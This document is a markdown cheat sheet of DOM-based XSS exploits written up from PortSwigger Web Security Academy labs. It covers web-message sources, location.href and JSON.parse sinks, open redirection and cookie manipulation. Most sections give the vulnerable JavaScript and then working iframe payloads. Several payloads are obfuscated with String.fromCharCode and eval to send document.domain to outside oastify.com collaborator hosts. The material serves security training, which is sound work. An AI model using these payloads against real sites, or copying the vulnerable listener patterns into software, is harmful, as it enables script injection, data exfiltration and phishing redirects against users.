# DOM-based Vulnerabilities

## Summary

* [Recon for DOM-based Vulnerabilities](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

<br>

## Resources

* https://portswigger.net/web-security/dom-based

* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting

* https://owasp.org/www-community/attacks/DOM_Based_XSS

* Cyber Chef - https://gchq.github.io/CyberChef/

* Cheat Sheets:

*   https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

*   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

* DOM Invader:  https://portswigger.net/burp/documentation/desktop/tools/dom-invader

<br>

## Recon

### Identify DOM-based Vulnerabilities

* DOM XSS happens when client-side JavaScript takes user-controllable input (source) and includes it into a dangerous function (sink).

* Use the Browser's Developers Tool and go to the Sources/Debugger tab.  In every page we can search for the keyword “script”, and we can also search through all the JavaScript files.

* In these files/pages, we can search for any **user-controllable sources** and **dangerous sinks** that the JavaScript is using.

* Analyze if JavaScript is taking any sources and including them into dangerous sinks.

* Search all static JavaScript files too.

* The labs in this document and in the [Cross-site Scripting/DOM XSS](#https://portswigger.net/web-security/cross-site-scripting/dom-based) section, include examples of user-controllable sources being used in dangerous sinks.

<br>

### Common Sources and Sinks

* https://portswigger.net/web-security/dom-based#common-sources

* https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities

<br>

---
---

<br>

## Cheat Sheet 

<br><br>

* Find more examples of exploit payloads in the XSS folder.

<br>

### Source - Web Messages

* Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink.  

    * Example:  window.postMessage(“\<img src=x onerror=alert(1)\>”)
    
    * Payload: (Insert this payload onto the Exploit Server.)

```html
<iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
<br>

* **Vulnerable Code:**

```javascript
<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>
```

<br>

* Exploitation Payload: (Use document.location to exfiltrate data, and encode the payload to bypass filters.)

   * Decoded Payload:

      * The below payload can be used to test in the Browser's Dev Tools console:
      
      * The String.fromCharCode() contains the following:
         
         * document.location = "https://mh7yjmia7.oastify.com/?x=" + document.domain + "END"
      
         * Note:  Use CyberChef to encode the data.  "To Decimal" -> Delimiter "Comma".  (Also the alert() was not needed here just used for testing)

```javascript
postMessage('<img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,109,104,55,121,106,109,105,97,55,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))>')
```

   * Final Payload: (Use in the Exploit Server.)

```javascript
<iframe src="https://0a41005003b5365e82996bf000200091.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,109,104,55,121,106,109,105,97,55,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))>','*')">
```



<br><br><br>

### Source - Web Messages location.href()

* Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink.  Example, the code will place the user-controllable input into the location.href sink, if the message contains the String “http:”. 

    * Example Payload (This can be used in the Browser's Console to test.):

    ```javascript
      window.postMessage(“javascript:alert(1)//http:”)
    ```
    
    * Payload: 

```html
<iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
<br>

* **Vulnerable Code:**

```javascript
<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>
```

<br>

* Exploitation Payload: (Use document.location to exfiltrate data and encode the payload to bypass filters.)

* This payload can be used in the Browser's Console to test. (The pseudo javascript protocol is used here as the data is inserted in href.)

```javascript
postMessage('javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,102,52,107,51,49,118,108,99,57,103,120,53,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:')
```

Final Payload:  (Use this in Exploit Server)

```javascript
<iframe src="https://0ac6000c045b941d800f44e400e9009d.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,98,114,54,122,119,122,110,110,99,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:','*')">
```

<br><br><br>


### Source - Web Messages JSON.parse()

* There is a client-side script on the application that has an event listener that is listening for a web message.  It is possible to submit crafted input which will be included in the “src” attribute of an \<iframe\>.  This is essentially the “location.href” sink.  We can use a JavaScript pseudo-protocol payload here – javascript:print()

   * Payload: 

```html
<iframe src=https://VULNERABLE-APPLICATION.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

<br>

* **Vulnerable Code:**

```javascript
<script>
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
</script>
```

<br>

Exploitation Payload:  (Similar as the above payloads for Web Messages.)  Check out the XSS folder of the cheatsheet for more payloads.

```javascript
<iframe src=https://0ab400b604252be5803512fc002b00ad.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,112,99,53,100,118,116,109,104,100,97,49,122,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))\"}","*")'>
```

<br></br><br>

### DOM XSS - Open Redirection

* There was a client-side script on the application that is taking in a query parameter called “url” and using the value in a location.href sink.  The URL needs to begin with “https://”.  

* The JavaScript Pseudo-protocol will not work here in this case, because we don't control the beginning of the href value.  This will simply redirect a user to a different website, can be used for phishing.

   * Example:  httpss://VULNERABLE-APPLICATION.net/post?postId=4&url=httpss://*user-input*

   * Payload:
   
```
https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER
```

<br>

* **Vulnerable Code:**

```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>
```

<br></br><br>

### DOM XSS - Cookie Manipulation

* The “window.location” source is being appended to a Cookie using the “document.cookie”.  This Cookie value is reflected back in the application's response within an HTML attribute.  Submit a crafted URL that will break out of the HTML context and execute JavaScript code.

    * Example (Context):  \<a href='httpss://VULNERABLE-APP.net/product?productId=*user-input*'\>

    * Payload:  &'\>\<script\>print()\</script\>


   **Note:  Need to use the & in the URL symbol to inject valid payload, since the application will throw an error if the "productId" is not valid.**
  
* The iframe will first load the vulnerable URL, which  will store it in "window.location" source.  Then the onload event will redirect to another page on the application, which will trigger the javascript, as the URL is reflected in the response.

* Final Payload:  (Use in Exploit Server.)

```html
<iframe src="https://VULNERABLE-APP.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://VULNERABLE-APP.net';window.x=1;">
```

<br>

* **Vulnerable Code:**

```javascript
<script>
   document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

<br>

* Exploitation Payload: (Use in Exploit Server.) (Payload is similar to the above mentions.)

```javascript
<iframe src="https://0ac0003e03b1155582af4721003c00da.web-security-academy.net/product?productId=1&'><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,100,101,118,49,98,116,104,49,100,112,50,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34))</script>" onload="if(!window.x)this.src='https://0ac0003e03b1155582af4721003c00da.web-security-academy.net';window.x=1;">
```


<br><br><br>

### Pending to complete labs that are missing from cheat sheet:

* LAB EXPERT Exploiting DOM clobbering to enable XSS

* LAB EXPERT Clobbering DOM attributes to bypass HTML filters
